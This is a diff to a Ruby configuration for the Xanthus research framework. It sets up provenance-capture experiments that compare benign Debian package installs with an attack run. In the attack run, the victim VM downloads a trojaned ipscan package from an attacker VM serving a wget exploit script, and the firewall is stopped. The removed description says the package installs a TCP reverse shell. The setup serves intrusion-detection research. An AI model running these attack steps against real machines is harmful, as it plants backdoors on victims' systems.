@@ -6,84 +6,176 @@
 # vi: set ft=ruby
 
 Xanthus.configure do |config|
-  config.name = 'camflow'
+  config.name = 'wget-apt'
   config.authors = 'Xueyuan Michael Han'
   config.description = %q{
-A simple CamFlow example to demonstrate:
-
-* Xanthus' compatibility with CamFlow, a whole-system provenance capture system, as its underlying audit system
-* How one can spawn multiple virtual machines in the framework
-* How one can create multiple logical steps in running the experiment in the framework
-* How one can write command in the framework directly
-* How one can provide scripts to virtual machines running in the framework
-* How one can run multiple jobs and multiple iterations within a job in the framework
-
-A standard Ubuntu Linux server (bento/ubuntu-18.04) machine is spawned to simulate an adversarial scenario where this compromised FTP server serves a weasponized Debian package to the victim machine.
-The victim machine (michaelh/ubuncam) is monitored by CamFlow and has pre-installed various vulnerable applications,
-including a now-outdated `wget` whose vulnerability is exploited by the attacker.
-
-In this simple example, when the victim machine downloads an ipscan Debian package from a compromised HTTP server machine (also the attacker machine),
-the wget command is redirectly to its FTP server and delivers a weasponized ipsan Debian package to the victim.
-Once the package is installed, the TCP reserver shell is installed at the same time and the attacker (Kali Linux) is able to control the victim machine.
-
-This example also runs the experiment of a benign behavior where a legitimate ipscan Debian package is downloaded. No harm was done in the benign experiment.
-
-Each experiment runs twice.
-
-Everything is done automatically through scripts for reproducility with minimum human interaction.
+WGET remote arbitrary file vulnerability is exploited with a weaponized Debian package with Trojan backdoor.
+The benign behavior downloads a series of Debian packages and install them to the system,
+while the attack behavior downloads the same series but one of the Debian packages is infected by the Trojan horse.
 }
-  # Use a random but fixed seed for reproducibility
-  config.seed = 298395371344679276525581697204129968199
+  config.seed = 148880941637144106481034814556217324021
 
-  # Marcos for start and stop CamFlow provenance capture system
-  config.script :camflow_start do
-    Xanthus::CAMFLOW_START
-  end
-
-  config.script :camflow_stop do
-    Xanthus::CAMFLOW_STOP
-  end
-
-  # Multiple logical steps to run experiments in a VM
   config.script :pre do
     %q{%{
+      sudo systemctl stop firewalld
       mkdir wgets
       cd wgets
       sleep 5
     }}
   end
 
+  config.script :camflow_start do
+    Xanthus::CAMFLOW_START
+  end
+
+  config.script :spade_start do
+    Xanthus::SPADE_START
+  end
+
   config.script :normal do
     %q{%{
+      sleep 5
+      /usr/local/bin/wget http://ftp.osuosl.org/pub/ubuntu/pool/universe/f/fonts-adf/fonts-adf-accanthis_0.20110505-1_all.deb
+      sudo dpkg -i fonts-adf-accanthis_0.20110505-1_all.deb
+      rm fonts-adf-accanthis_0.20110505-1_all.deb
+      sleep 5
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/main/j/java-common/java-common_0.63ubuntu1~02_all.deb
+      sudo dpkg -i java-common_0.63ubuntu1~02_all.deb
+      rm java-common_0.63ubuntu1~02_all.deb
+      sleep 8
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/a/arc/arc_5.21q-5_amd64.deb
+      sudo dpkg -i arc_5.21q-5_amd64.deb
+      rm arc_5.21q-5_amd64.deb
+      sleep 3
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/s/sx/sx_2.0+ds-4build2_amd64.deb
+      sudo dpkg -i sx_2.0+ds-4build2_amd64.deb
+      rm sx_2.0+ds-4build2_amd64.deb
+      sleep 12
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/e/edb/edb_1.31-3_all.deb
+      sudo dpkg -i edb_1.31-3_all.deb
+      rm edb_1.31-3_all.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/c/carmetal/carmetal_3.5.2+dfsg-1.1_all.deb
+      sudo dpkg -i carmetal_3.5.2+dfsg-1.1_all.deb
+      rm carmetal_3.5.2+dfsg-1.1_all.deb
+      sleep 10
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/s/spl-linux/spl_0.7.5-1ubuntu2_amd64.deb
+      sudo dpkg -i spl_0.7.5-1ubuntu2_amd64.deb
+      rm spl_0.7.5-1ubuntu2_amd64.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/a/aurora/aurora_1.9.3-0ubuntu1_amd64.deb
+      sudo dpkg -i aurora_1.9.3-0ubuntu1_amd64.deb
+      rm aurora_1.9.3-0ubuntu1_amd64.deb
+      sleep 1
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/j/jzmq/libzmq-java_3.1.0-10_amd64.deb
+      sudo dpkg -i libzmq-java_3.1.0-10_amd64.deb
+      rm libzmq-java_3.1.0-10_amd64.deb
+      sleep 6
       /usr/local/bin/wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
       sudo dpkg -i ipscan_3.5.5_amd64.deb
       rm ipscan_3.5.5_amd64.deb
-      sleep 5
+      sleep 4
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/x/xmlto/xmlto_0.0.28-2_amd64.deb
+      sudo dpkg -i xmlto_0.0.28-2_amd64.deb
+      rm xmlto_0.0.28-2_amd64.deb
+      sleep 16
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/p/plexus-languages/libplexus-languages-java_0.9.5-2_all.deb
+      sudo dpkg -i libplexus-languages-java_0.9.5-2_all.deb
+      rm libplexus-languages-java_0.9.5-2_all.deb
+      sleep 1
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/z/zathura-pdf-poppler/zathura-pdf-poppler_0.2.8-1_amd64.deb
+      sudo dpkg -i zathura-pdf-poppler_0.2.8-1_amd64.deb
+      rm zathura-pdf-poppler_0.2.8-1_amd64.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/f/fasd/fasd_1.0.1-1_all.deb
+      sudo dpkg -i fasd_1.0.1-1_all.deb
+      rm fasd_1.0.1-1_all.deb
+      sleep 7
       apt list --installed > /tmp/list.txt
     }}
   end
 
   config.script :attack do
     %q{%{
+      /usr/local/bin/wget http://ftp.osuosl.org/pub/ubuntu/pool/universe/f/fonts-adf/fonts-adf-accanthis_0.20110505-1_all.deb
+      sudo dpkg -i fonts-adf-accanthis_0.20110505-1_all.deb
+      rm fonts-adf-accanthis_0.20110505-1_all.deb
+      sleep 5
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/main/j/java-common/java-common_0.63ubuntu1~02_all.deb
+      sudo dpkg -i java-common_0.63ubuntu1~02_all.deb
+      rm java-common_0.63ubuntu1~02_all.deb
+      sleep 8
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/a/arc/arc_5.21q-5_amd64.deb
+      sudo dpkg -i arc_5.21q-5_amd64.deb
+      rm arc_5.21q-5_amd64.deb
+      sleep 3
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/s/sx/sx_2.0+ds-4build2_amd64.deb
+      sudo dpkg -i sx_2.0+ds-4build2_amd64.deb
+      rm sx_2.0+ds-4build2_amd64.deb
+      sleep 12
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/e/edb/edb_1.31-3_all.deb
+      sudo dpkg -i edb_1.31-3_all.deb
+      rm edb_1.31-3_all.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/c/carmetal/carmetal_3.5.2+dfsg-1.1_all.deb
+      sudo dpkg -i carmetal_3.5.2+dfsg-1.1_all.deb
+      rm carmetal_3.5.2+dfsg-1.1_all.deb
+      sleep 10
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/s/spl-linux/spl_0.7.5-1ubuntu2_amd64.deb
+      sudo dpkg -i spl_0.7.5-1ubuntu2_amd64.deb
+      rm spl_0.7.5-1ubuntu2_amd64.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/a/aurora/aurora_1.9.3-0ubuntu1_amd64.deb
+      sudo dpkg -i aurora_1.9.3-0ubuntu1_amd64.deb
+      rm aurora_1.9.3-0ubuntu1_amd64.deb
+      sleep 1
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/j/jzmq/libzmq-java_3.1.0-10_amd64.deb
+      sudo dpkg -i libzmq-java_3.1.0-10_amd64.deb
+      rm libzmq-java_3.1.0-10_amd64.deb
+      sleep 6
       /usr/local/bin/wget 192.168.33.3/ipscan_3.5.5_amd64.deb
       sudo dpkg -i ipscan_3.5.5_amd64.deb
       rm ipscan_3.5.5_amd64.deb
-      sleep 5
+      sleep 4
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/x/xmlto/xmlto_0.0.28-2_amd64.deb
+      sudo dpkg -i xmlto_0.0.28-2_amd64.deb
+      rm xmlto_0.0.28-2_amd64.deb
+      sleep 16
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/p/plexus-languages/libplexus-languages-java_0.9.5-2_all.deb
+      sudo dpkg -i libplexus-languages-java_0.9.5-2_all.deb
+      rm libplexus-languages-java_0.9.5-2_all.deb
+      sleep 1
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/z/zathura-pdf-poppler/zathura-pdf-poppler_0.2.8-1_amd64.deb
+      sudo dpkg -i zathura-pdf-poppler_0.2.8-1_amd64.deb
+      rm zathura-pdf-poppler_0.2.8-1_amd64.deb
+      sleep 7
+      /usr/local/bin/wget http://mirrors.kernel.org/ubuntu/pool/universe/f/fasd/fasd_1.0.1-1_all.deb
+      sudo dpkg -i fasd_1.0.1-1_all.deb
+      rm fasd_1.0.1-1_all.deb
+      sleep 7
       apt list --installed > /tmp/list.txt
     }}
   end
 
+  config.script :camflow_stop do
+    Xanthus::CAMFLOW_STOP
+  end
+
+  config.script :spade_stop do
+    Xanthus::SPADE_STOP
+  end
+
   config.script :post do
     %q{%{
+      sleep 10
       cd ..
       rm -rf wgets
     }}
   end
 
-  # Actions taken by a different VM
-  # It is able to run a python script provided by the user
   config.script :server do
     %q{%{
+      sudo systemctl stop firewalld
       sudo apt-get -y update
       sudo apt-get -y install build-essential
       sudo apt-get -y install python-pip python-dev
@@ -97,15 +189,20 @@ Everything is done automatically through scripts for reproducility with minimum 
       mkdir /tmp/webtest
       cd /tmp/webtest
       wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
-      sudo python /vagrant/wget-exploit.py > /tmp/wget.txt & 
-      sleep 5
+      cp /vagrant/wget-exploit3.py /tmp/webtest
+      sudo python3 /tmp/webtest/wget-exploit3.py > /tmp/wget.txt &
     }}
   end
 
-  # Spawn two VMs, one is custom packaged (michaelh/ubuncam) by the author
-  # and the other is a basic Ubuntu VM box
   config.vm :camflow do |vm|
     vm.box = 'michaelh/ubuncam'
+    vm.version = '0.0.3'
+    vm.ip = '192.168.33.8'
+  end
+
+  config.vm :spade do |vm|
+    vm.box = 'michaelh/spade'
+    vm.memory = 8192
     vm.version = '0.0.3'
     vm.ip = '192.168.33.8'
   end
@@ -116,25 +213,39 @@ Everything is done automatically through scripts for reproducility with minimum 
     vm.ip = '192.168.33.3'
   end
 
-  # Xanthus supports multiple jobs or experiments and within each job multiple iterations
   config.job :normal_camflow do |job|
-    job.iterations = 2
+    job.iterations = 125
     job.tasks = {camflow: [:pre, :camflow_start, :normal, :camflow_stop, :post]}
-    job.outputs = {camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
+    job.outputs = {camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log', system: '/tmp/list.txt'}}
   end
 
-  # Xanthus supports input scripts, files, packages provided by the user to the VM
-  # These provisions are accessible directly from '/vagrant' folder in the VM
   config.job :attack_camflow do |job|
-    job.iterations = 2
+    job.iterations = 25
     job.tasks = {server: [:server], camflow: [:pre, :camflow_start, :attack, :camflow_stop, :post]}
     job.inputs = {server: ['ipscan_3.5.5_amd64.deb', 'wget-exploit.py']}
     job.outputs = {server: {trace: '/tmp/wget.txt'}, camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log', system: '/tmp/list.txt'}}
   end
 
-  # Uncomment the following code and provide GitHub credentials to push the results to GitHub
-  # config.github do |github|
-  #   github.repo = '<ADD GITHUB REPO user/name>'
-  #   github.token = '<ADD GITHUB TOKEN>'
-  # end
+  config.job :normal_spade do |job|
+    job.iterations = 125
+    job.tasks = {spade: [:pre, :spade_start, :normal, :spade_stop, :post]}
+    job.outputs = {spade: {trace: '/tmp/audit_cdm.avro'}}
+  end
+
+  config.job :attack_spade do |job|
+    job.iterations = 25
+    job.tasks = {server: [:server], spade: [:pre, :spade_start, :attack, :spade_stop, :post]}
+    job.inputs = {server: ['ipscan_3.5.5_amd64.deb', 'wget-exploit.py']}
+    job.outputs = {spade: {trace: '/tmp/audit_cdm.avro'}}
+  end
+
+  config.github do |github|
+    github.repo = 'https://github.com/michael-hahn/camflow-apt-raw.git'
+		github.token = 'REMOVED'
+  end
+
+  config.github do |github|
+    github.repo = 'tfjmp/wget-apt'
+		github.token = 'REMOVED'
+  end
 end
